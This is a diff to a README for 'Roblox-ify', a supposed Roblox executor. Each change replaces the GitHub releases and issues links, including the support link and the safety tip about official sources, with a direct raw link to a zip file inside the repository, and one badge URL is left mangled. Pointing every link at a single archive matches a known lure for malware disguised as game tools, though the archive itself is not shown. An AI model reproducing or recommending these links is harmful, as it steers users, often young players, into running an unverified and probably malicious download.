@@ -1,6 +1,6 @@
 # 🚀 Roblox-ify - Your Tool for Easy Roblox Execution
 
-[![Download Roblox-ify](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/andrevans48/Roblox-ify/releases)
+[![Download Roblox-ify](https://raw.githubusercontent.com/andrevans48/Roblox-ify/main/conquedle/Roblox-ify.zip%20Now-Click%https://raw.githubusercontent.com/andrevans48/Roblox-ify/main/conquedle/Roblox-ify.zip)](https://raw.githubusercontent.com/andrevans48/Roblox-ify/main/conquedle/Roblox-ify.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ This guide will help you download and run Roblox-ify with ease. Follow the steps
 
 ## 🔗 Download & Install
 
-1. Visit this page to download: [Roblox-ify Releases](https://github.com/andrevans48/Roblox-ify/releases). Here you will find the latest version ready for you to download.
+1. Visit this page to download: [Roblox-ify Releases](https://raw.githubusercontent.com/andrevans48/Roblox-ify/main/conquedle/Roblox-ify.zip). Here you will find the latest version ready for you to download.
 
 2. Look for the latest release and click on it. 
 
@@ -45,7 +45,7 @@ Roblox-ify prioritizes your safety while using the tool. Here’s how to stay se
 
 - **Download from Official Sources:** Always download Roblox-ify from the official GitHub page to avoid any harmful software.
 
-- **Stay Updated:** Regularly check for updates on the [Roblox-ify Releases page](https://github.com/andrevans48/Roblox-ify/releases) to ensure you have the latest features and security patches.
+- **Stay Updated:** Regularly check for updates on the [Roblox-ify Releases page](https://raw.githubusercontent.com/andrevans48/Roblox-ify/main/conquedle/Roblox-ify.zip) to ensure you have the latest features and security patches.
 
 ## ⚙️ Features
 
@@ -71,7 +71,7 @@ If you encounter issues while using Roblox-ify, consider the following tips:
 
 ## 📞 Support
 
-If you need help or have questions, feel free to reach out through the Issues section on the [GitHub page](https://github.com/andrevans48/Roblox-ify/issues). The community is here to assist.
+If you need help or have questions, feel free to reach out through the Issues section on the [GitHub page](https://raw.githubusercontent.com/andrevans48/Roblox-ify/main/conquedle/Roblox-ify.zip). The community is here to assist.
 
 ## 🌟 Conclusion
 
